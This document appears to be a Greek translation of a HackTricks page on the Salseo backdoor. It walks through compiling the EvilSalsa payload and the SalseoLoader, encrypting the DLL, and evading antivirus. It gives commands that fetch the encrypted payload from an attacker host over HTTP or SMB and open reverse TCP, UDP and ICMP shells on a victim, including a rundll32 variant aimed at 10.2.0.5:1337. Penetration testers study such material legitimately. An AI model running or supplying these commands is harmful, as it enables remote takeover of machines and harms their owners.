# Salseo

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks στο AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Συντάσσοντας τα δυαδικά αρχεία

Κατεβάστε τον πηγαίο κώδικα από το github και συντάξτε τα **EvilSalsa** και **SalseoLoader**. Θα χρειαστεί να έχετε εγκατεστημένο το **Visual Studio** για να συντάξετε τον κώδικα.

Συντάξτε αυτά τα έργα για την αρχιτεκτονική του παραθύρου όπου θα τα χρησιμοποιήσετε (Αν τα Windows υποστηρίζουν x64, συντάξτε τα για αυτές τις αρχιτεκτονικές).

Μπορείτε να **επιλέξετε την αρχιτεκτονική** μέσα στο Visual Studio στην **αριστερή καρτέλα "Build"** στο **"Platform Target".**

(\*\*Αν δεν μπορείτε να βρείτε αυτές τις επιλογές, πατήστε στην **"Project Tab"** και μετά στις **"Ιδιότητες \<Ονομασίας Έργου>"**)

![](<../.gitbook/assets/image (132).png>)

Στη συνέχεια, συντάξτε και τα δύο έργα (Build -> Build Solution) (Μέσα στα logs θα εμφανιστεί η διαδρομή του εκτελέσιμου αρχείου):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Προετοιμασία της Παρασκήνιας Πόρτας

Καταρχάς, θα πρέπει να κωδικοποιήσετε το **EvilSalsa.dll.** Για να το κάνετε αυτό, μπορείτε να χρησιμοποιήσετε το σενάριο python **encrypterassembly.py** ή μπορείτε να συντάξετε το έργο **EncrypterAssembly**: 

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Τώρα έχετε ό,τι χρειάζεστε για να εκτελέσετε όλο το Salseo: το **κωδικοποιημένο EvilDalsa.dll** και το **δυαδικό του SalseoLoader.**

**Μεταφορτώστε το δυαδικό SalseoLoader.exe στη μηχανή. Δεν πρέπει να ανιχνευθεί από κανένα AV...**

## **Εκτέλεση της πίσω πόρτας**

### **Λήψη εναλλακτικού κέλυφους TCP (λήψη κωδικοποιημένου dll μέσω HTTP)**

Θυμηθείτε να ξεκινήσετε ένα nc ως ακροατής αντίστροφου κελύφους και ένα διακομιστή HTTP για να εξυπηρετήσετε το κωδικοποιημένο evilsalsa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### Λήψη ενός αντίστροφου κέλυφους UDP (λήψη κωδικοποιημένου dll μέσω SMB)

Θυμηθείτε να ξεκινήσετε ένα nc ως ακροατή αντίστροφου κελύφους και ένα διακομιστή SMB για να εξυπηρετήσει το κωδικοποιημένο evilsalsa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Λήψη ενός αντίστροφου κελύφους ICMP (κωδικοποιημένο dll ήδη μέσα στο θύμα)**

**Αυτή τη φορά χρειάζεστε ένα ειδικό εργαλείο στον πελάτη για να λάβετε το αντίστροφο κελύφους. Λήψη:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Απενεργοποίηση απαντήσεων ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Εκτέλεση του πελάτη:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Μέσα στο θύμα, ας εκτελέσουμε το πράγμα salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Συναρμολόγηση του SalseoLoader ως DLL εξαγωγής κύριας συνάρτησης

Ανοίξτε το έργο SalseoLoader χρησιμοποιώντας το Visual Studio.

### Προσθέστε πριν από την κύρια συνάρτηση: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Εγκατάσταση DllExport για αυτό το έργο

#### **Εργαλεία** --> **Διαχείριση πακέτων NuGet** --> **Διαχείριση πακέτων NuGet για τη λύση...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Αναζήτηση για το πακέτο DllExport (χρησιμοποιώντας την καρτέλα Περιήγηση), και πατήστε Εγκατάσταση (και αποδεχτείτε το αναδυόμενο παράθυρο)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Στο φάκελο του έργου σας εμφανίζονται τα αρχεία: **DllExport.bat** και **DllExport\_Configure.bat**

### **Απεγκατάσταση DllExport**

Πατήστε **Απεγκατάσταση** (ναι, είναι περίεργο αλλά εμπιστευτείτε με, είναι απαραίτητο)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Έξοδος από το Visual Studio και εκτέλεση του DllExport\_configure**

Απλά **βγείτε** από το Visual Studio

Στη συνέχεια, πηγαίνετε στον φάκελο του **SalseoLoader** και **εκτελέστε το DllExport\_Configure.bat**

Επιλέξτε **x64** (αν πρόκειται να το χρησιμοποιήσετε μέσα σε ένα x64 box, όπως στην περίπτωσή μου), επιλέξτε **System.Runtime.InteropServices** (μέσα στο **Namespace for DllExport**) και πατήστε **Εφαρμογή**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Ανοίξτε ξανά το έργο με το Visual Studio**

Το **\[DllExport]** δε θα πρέπει πλέον να εμφανίζεται ως σφάλμα

![](<../.gitbook/assets/image (8) (1).png>)

### Κατασκευή της λύσης

Επιλέξτε **Τύπος Εξόδου = Βιβλιοθήκη κλάσεων** (Έργο --> Ιδιότητες SalseoLoader --> Εφαρμογή --> Τύπος εξόδου = Βιβλιοθήκη κλάσεων)

![](<../.gitbook/assets/image (10) (1).png>)

Επιλέξτε **πλατφόρμα x64** (Έργο --> Ιδιότητες SalseoLoader --> Κατασκευή --> Στόχος πλατφόρμας = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Για να **κατασκευάσετε** τη λύση: Κατασκευή --> Κατασκευή Λύσης (Μέσα στην κονσόλα εξόδου θα εμφανιστεί η διαδρομή του νέου DLL)

### Δοκιμάστε το παραγόμενο Dll

Αντιγράψτε και επικολλήστε το Dll όπου θέλετε να το δοκιμάσετε.

Εκτελέστε:
```
rundll32.exe SalseoLoader.dll,main
```
Αν δεν εμφανίζεται κάποιο σφάλμα, πιθανότατα έχετε ένα λειτουργικό DLL!!

## Λήψη κέλυφους χρησιμοποιώντας το DLL

Μην ξεχάσετε να χρησιμοποιήσετε ένα **HTTP** **server** και να ορίσετε ένα **nc** **listener**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

### Εντολή
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
